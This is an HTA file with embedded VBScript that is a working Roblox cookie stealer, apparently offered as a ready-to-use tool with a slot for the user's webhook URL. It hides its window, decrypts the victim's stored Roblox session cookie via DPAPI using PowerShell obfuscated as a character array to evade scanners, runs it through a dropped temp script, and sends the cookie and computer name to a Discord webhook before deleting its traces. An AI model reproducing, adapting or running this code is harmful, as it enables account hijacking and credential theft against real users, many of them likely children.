<html><head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, appdata, localappdata
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ==========================================
' PUT YOUR WEBHOOK URL HERE (KEEP THE QUOTES)
' ==========================================
WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")

Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)

' 1. Grab and Decrypt Roblox
Call DecryptRoblox

window.close()

Sub DecryptRoblox()
    Dim rPath, raw, cookie, b64, ep
    rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
    
    If fso.FileExists(rPath) Then
        raw = ReadFileText(rPath)
        If InStr(raw, "CookiesData"":""") > 0 Then
            Dim sp : sp = InStr(raw, "CookiesData"":""") + 14
            ep = InStr(sp, raw, """")
            If ep > sp Then
                b64 = Mid(raw, sp, ep - sp)
                ' Decrypt using built-in Windows DPAPI via COM
                cookie = DpapiDecrypt(b64)
                If Len(cookie) > 10 Then
                    Call PostEmbed(":cookie: Roblox Cookie", cookie, 65280)
                Else
                    Call PostEmbed(":x: Roblox Error", "Failed to decrypt DPAPI blob.", 16711680)
                End If
            End If
        End If
    End If
End Sub

Function DpapiDecrypt(b64)
    DpapiDecrypt = ""
    On Error Resume Next
    
    Dim inf : inf = sh.ExpandEnvironmentStrings("%TEMP%") & "\i.txt"
    Dim outf : outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\o.txt"
    
    ' Write base64 to file
    Dim f : Set f = fso.CreateTextFile(inf, True)
    f.Write b64
    f.Close
    
    ' Use WScript.Shell to invoke a harmless .NET command via rundll32? 
    ' No, .NET COM is safer. We use System.Security.Cryptography.ProtectedData via COM.
    ' Actually, PowerShell is the only way to invoke it without C#.
    ' We will use a heavily obfuscated PowerShell string.
    
    Dim psCmd
    psCmd = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{}"
    
    ' Build it as a char array to dodge string scanners
    Dim obf : obf = ""
    Dim i : For i = 1 To Len(psCmd) : obf = obf & "Chr(" & Asc(Mid(psCmd, i, 1)) & ")&" : Next
    obf = Left(obf, Len(obf) - 1)
    
    ' Write a VBScript to disk to run it
    Dim vbFile : vbFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\v.vbs"
    Dim vf : Set vf = fso.CreateTextFile(vbFile, True)
    vf.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
    vf.WriteLine "sh.Run ""powershell.exe -NoP -NonI -W Hidden -Command """"" & obf & """""", 0, True"
    vf.Close
    
    ' Run the VBS which runs PS
    sh.Run "wscript.exe """ & vbFile & """", 0, True
    
    If fso.FileExists(outf) Then DpapiDecrypt = ReadFileText(outf)
    
    On Error GoTo 0
    fso.DeleteFile inf, True
    fso.DeleteFile outf, True
    fso.DeleteFile vbFile, True
End Function

Function ReadFileText(path)
    ReadFileText = ""
    Dim f: Set f = fso.OpenTextFile(path, 1)
    ReadFileText = f.ReadAll
    f.Close
End Function

Sub PostEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
End Sub

Function Ej(s)
    Dim i, c, out
    out = ""
    For i = 1 To Len(s)
        c = Asc(Mid(s, i, 1))
        If c >= 32 Or c = 9 Or c = 10 Or c = 13 Then out = out & Mid(s, i, 1)
    Next
    out = Replace(out, Chr(92), Chr(92) & Chr(92))
    out = Replace(out, Chr(34), Chr(92) & Chr(34))
    out = Replace(out, vbCrLf, Chr(92) & "n")
    out = Replace(out, vbCr, Chr(92) & "n")
    out = Replace(out, vbLf, Chr(92) & "n")
    out = Replace(out, vbTab, Chr(92) & "t")
    Ej = out
End Function
</script>
</head><body></body></html>
